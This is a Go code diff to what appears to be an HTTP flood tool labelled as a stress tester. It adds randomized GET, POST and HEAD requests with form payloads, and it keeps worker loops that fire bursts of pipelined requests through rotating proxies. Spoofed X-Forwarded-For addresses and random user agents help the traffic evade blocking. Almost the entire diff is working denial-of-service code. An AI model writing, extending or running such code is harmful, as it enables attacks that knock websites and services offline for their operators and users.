@@ -99,86 +99,99 @@ func initHeaderPool(cfg *StressConfig) {
 	if cfg.CustomHost != "" {
 		hostHdr = cfg.CustomHost
 	}
+	methods := []string{"GET", "GET", "GET", "POST", "HEAD"}
+
 	for i := range headerPool {
+		method := methods[rand.Intn(len(methods))]
 		var buf bytes.Buffer
-		buf.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\n", cfg.Path))
+
+		// Request line
+		buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, cfg.Path))
+
+		// Common headers
 		buf.WriteString(fmt.Sprintf("Host: %s:%d\r\n", hostHdr, cfg.Port))
 		buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
 		buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
 		buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
 		buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
 		buf.WriteString("Connection: keep-alive\r\n")
-		buf.WriteString(fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n",
-			rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)))
-		buf.WriteString("\r\n")
+		buf.WriteString(
+			fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n",
+				rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
+		)
+
+		// POST payload
+		if method == "POST" {
+			payload := fmt.Sprintf("field1=%s&field2=%d", randomString(8), rand.Intn(1000))
+			buf.WriteString("Content-Type: application/x-www-form-urlencoded\r\n")
+			buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(payload)))
+			buf.WriteString("\r\n")
+			buf.WriteString(payload)
+		} else {
+			buf.WriteString("\r\n")
+		}
+
 		headerPool[i] = buf.Bytes()
 	}
 }
 
 func runWorkers(ctx context.Context, cfg *StressConfig) {
-    var wg sync.WaitGroup
+	var wg sync.WaitGroup
 
-    for wid := 0; wid < cfg.Threads; wid++ {
-        wg.Add(1)
-        proxyAddr := cfg.Proxies[wid % len(cfg.Proxies)]
+	for wid := 0; wid < cfg.Threads; wid++ {
+		wg.Add(1)
+		proxyAddr := cfg.Proxies[wid%len(cfg.Proxies)]
 
-        go func(id int, proxy string) {
-            defer wg.Done()
-            target := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
+		go func(id int, proxy string) {
+			defer wg.Done()
+			target := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
 
-            // spin up numConnsPerWorker parallel send-loops
-            var innerWg sync.WaitGroup
-            for cnum := 0; cnum < numConnsPerWorker; cnum++ {
-                innerWg.Add(1)
-                go func(connID int) {
-                    defer innerWg.Done()
-                    var conn net.Conn
-                    var err error
+			var innerWg sync.WaitGroup
+			for cnum := 0; cnum < numConnsPerWorker; cnum++ {
+				innerWg.Add(1)
+				go func(connID int) {
+					defer innerWg.Done()
+					var conn net.Conn
+					var err error
 
-                    for {
-                        // stop if time's up
-                        if ctx.Err() != nil {
-                            if conn != nil {
-                                conn.Close()
-                            }
-                            return
-                        }
+					for {
+						if ctx.Err() != nil {
+							if conn != nil {
+								conn.Close()
+							}
+							return
+						}
 
-                        // ensure we have a live socket
-                        if conn == nil {
-                            conn, _, err = connect(proxy, target)
-                            if err != nil {
-                                time.Sleep(50 * time.Millisecond)
-                                continue
-                            }
-                        }
+						if conn == nil {
+							conn, _, err = connect(proxy, target)
+							if err != nil {
+								time.Sleep(50 * time.Millisecond)
+								continue
+							}
+						}
 
-                        // send one burst
-                        bufs := make(net.Buffers, burstSize)
-                        hdr := headerPool[rand.Intn(headerPoolSize)]
-                        for i := range bufs {
-                            bufs[i] = hdr
-                        }
-                        if _, err = bufs.WriteTo(conn); err != nil {
-                            conn.Close()
-                            conn = nil
-                            continue
-                        }
+						bufs := make(net.Buffers, burstSize)
+						hdr := headerPool[rand.Intn(headerPoolSize)]
+						for i := range bufs {
+							bufs[i] = hdr
+						}
+						if _, err = bufs.WriteTo(conn); err != nil {
+							conn.Close()
+							conn = nil
+							continue
+						}
 
-                        // no more than ~1ms backoff so other loops can run
-                        time.Sleep(10 * time.Millisecond)
-                    }
-                }(cnum)
-            }
+						time.Sleep(10 * time.Millisecond)
+					}
+				}(cnum)
+			}
 
-            // wait for all conn-loops to finish (when ctx expires)
-            innerWg.Wait()
-        }(wid, proxyAddr)
-    }
+			innerWg.Wait()
+		}(wid, proxyAddr)
+	}
 
-    wg.Wait()
+	wg.Wait()
 }
-
 
 func connect(proxyAddr, target string) (net.Conn, bool, error) {
 	proxyURL, err := url.Parse("http://" + proxyAddr)
@@ -191,7 +204,6 @@ func connect(proxyAddr, target string) (net.Conn, bool, error) {
 		return nil, false, err
 	}
 
-	// if HTTPS, do HTTP CONNECT + TLS handshake
 	if strings.HasSuffix(target, ":443") {
 		req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
 		if _, err := conn.Write([]byte(req)); err != nil {
@@ -271,4 +283,14 @@ func randomUserAgent() string {
 		v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
 		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version=13.1 Safari/%s", os, v, v)
 	}
+}
+
+// randomString returns a random alphanumeric string of length n.
+func randomString(n int) string {
+	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+	b := make([]rune, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
 }
